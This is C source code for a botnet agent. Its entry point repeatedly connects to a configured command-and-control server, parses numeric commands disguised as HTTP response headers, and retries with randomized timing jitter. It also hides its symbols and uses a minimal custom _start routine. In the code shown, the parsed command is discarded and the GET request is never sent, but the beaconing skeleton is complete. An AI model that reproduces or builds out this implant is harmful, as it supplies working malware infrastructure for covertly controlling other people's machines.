


#include "agent.h"




#define _FULL_IO(io_op) {                                       \
    LONG total = 0;                                             \
                                                                \
    while (total < size) {                                      \
        const LONG n = io_op(fd, buf + total, size - total);    \
                                                                \
        if (_UNLIKELY(n == -EINTR)) continue;                   \
        if (_UNLIKELY(n <= 0     )) return FALSE;               \
                                                                \
        total += n;                                             \
    }                                                           \
                                                                \
    return TRUE;                                                \
}

DEC_FUNC(BOOLEAN) read_full(const LONG fd, BYTE *const buf, const LONG size)
    _FULL_IO(read)

DEC_FUNC(BOOLEAN) write_full(const LONG fd, CONST_PTR(BYTE) buf, const LONG size)
    _FULL_IO(write)

#undef _FULL_IO




DEC_FUNC(BOOLEAN) send_GET(const LONG sockFd) {
    static const BYTE hdrGet[] = BOT_HDR_HTTP_GET;
    return write_full(sockFd, hdrGet, sizeof(hdrGet) - 1);
}




DEC_FUNC(CMDSZ) recv_cmd(const LONG sockFd) {
    static BYTE hdr[SIZE_HTTP_HDR_CMD];
    CMDSZ cmd = 0;

    /* */
    if (not read_full(sockFd, hdr, SIZE_HTTP_HDR_CMD) or
        ((hdr[0] != 'H') or (hdr[1] != 'T') or (hdr[2] != 'T') or (hdr[3] != 'P')) or
        ((hdr[13] != 'O') or (hdr[14] != 'K'))
    ) return cmd;


    UINT8 i = 9;

    while ((i < SIZE_HTTP_HDR_CMD) and (
        (hdr[i] >= '0') and (hdr[i] <= '9')
    )) {
        cmd = (cmd * 10) + (hdr[i] - '0');
        ++i;
    }

    return cmd;
}




/* base ± mask/2 ms. mask = 2^n - 1. Requires base >= mask/2. */
DEC_FUNC(ULONG) delay_jitter(ULONG *const seed, const ULONG base, const ULONG mask) {
    *seed = (*seed * 6364136223846793005UL) + 1442695040888963407UL;
    return (base - (mask >> 1)) + (*seed & mask);
}




/*
/===========================\
 *     BOT-ENTRY-POINT     *
\===========================/
*/
_GCC_ATTR(noreturn, visibility("hidden"))
VOID Main(VOID) {
    ULONG seedJitter = 0x243F6A8885A308D3UL; // Fractional part of Pi
    getrandom(&seedJitter, sizeof(seedJitter), GRND_NONBLOCK);

    LONG sockFd;
    const struct sockaddr_in sockHost = {
        .sin_family = AF_INET,
        .sin_port   = htons(BOT_SERVER_PORT),
        .sin_addr   = BOT_SERVER_IPV4
    };


    while (TRUE) {
        if (SYSOK(sockFd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP))) {
            if (SYSOK(connect(sockFd, &sockHost, sizeof(struct sockaddr_in)))) {
                recv_cmd(sockFd);
            }

            close(sockFd);
        }
        sys_sleep(delay_jitter(&seedJitter, SOCK_RETRY_DELAY, SOCK_RETRY_MASK));
    }

    _UNREACHABLE();
}


/* ELF Process Entry Point: transfer control to Main (no arguments) */
_GCC_ATTR(naked, noreturn, visibility("hidden"))
VOID _start(VOID) {
    _GCC_ASM (
        "andq $-16, %rsp\n\t" // 1. Enforce 16-byte stack alignment
        "subq $8,   %rsp\n\t" // 2. Align stack for SysV AMD64 function entry
        "jmp Main\n\t"        // 3. Direct PC-relative jump (PIE-safe)
    );
    _UNREACHABLE();
}
